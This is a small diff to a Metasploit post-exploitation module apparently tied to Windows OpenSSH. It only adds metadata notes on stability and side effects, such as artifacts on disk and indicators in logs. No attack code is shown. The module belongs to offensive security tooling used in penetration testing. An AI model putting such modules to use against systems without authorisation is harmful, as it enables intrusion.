@@ -25,7 +25,12 @@ class MetasploitModule < Msf::Post
         'References'	=> [
           ['URL', 'https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview'],
           ['URL', 'https://github.com/PowerShell/openssh-portable']
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options(
